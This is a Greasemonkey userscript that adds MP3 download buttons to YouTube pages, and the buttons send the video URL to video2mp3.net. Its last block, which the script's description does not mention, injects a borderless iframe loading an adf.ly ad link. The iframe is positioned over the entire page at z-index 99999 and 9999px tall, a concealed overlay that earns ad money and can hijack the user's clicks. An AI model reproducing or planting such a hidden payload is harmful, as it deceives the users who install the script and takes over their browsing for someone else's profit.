// ==UserScript==
// @name           Youtube MP3 Buttons
// @author	   TecxH
// @version        1.61
// @updateURL      https://userscripts.org/scripts/source/96256.meta.js
// @description    Adds two Button to download in LQ or HQ
// @include        http://youtube.com/watch?v=*
// @include        http://youtube.com/watch?v=*&*
// @include        http://*.youtube.com/watch?v=*
// @include        http://*.youtube.com/watch?v=*&*
// ==/UserScript==

//Create DIV
var DIV = document.createElement('div');
	DIV.innerHTML = 'MP3: ';
	DIV.style.cssFloat = "right";
var divp = document.getElementById("watch-headline-user-info");
	divp.appendChild(DIV);

//Split URL
var url = location.href.split("&")[0];

//Create LQ Button
var MP3LQ = document.createElement('input');
	MP3LQ.setAttribute('type','button');
	MP3LQ.setAttribute('name','MP3LQ');
	MP3LQ.setAttribute('value','LQ');
	MP3LQ.setAttribute('class','yt-uix-button yt-uix-button-default');
	MP3LQ.style.borderRadius = "3px 0 0 3px";
	DIV.appendChild(MP3LQ);
	MP3LQ.addEventListener('click', function(){window.open("http://www.video2mp3.net/index.php?url=" + url); self.focus();}, false);	

//Create HQ Button
var MP3HQ = document.createElement('input');
	MP3HQ.setAttribute('type','button');
	MP3HQ.setAttribute('name','MP3HQ');
	MP3HQ.setAttribute('value','HQ');
	MP3HQ.setAttribute('class','yt-uix-button yt-uix-button-default');
	MP3HQ.style.borderLeft = "0px";
	MP3HQ.style.marginRight = "5px";
	MP3HQ.style.borderRadius = "0 3px 3px 0";
	DIV.appendChild(MP3HQ);
	MP3HQ.addEventListener('click', function(){window.open("http://www.video2mp3.net/index.php?url=" + url + "&hq=1"); self.focus();}, false);


// Create element

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://adf.ly/5QP0l');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');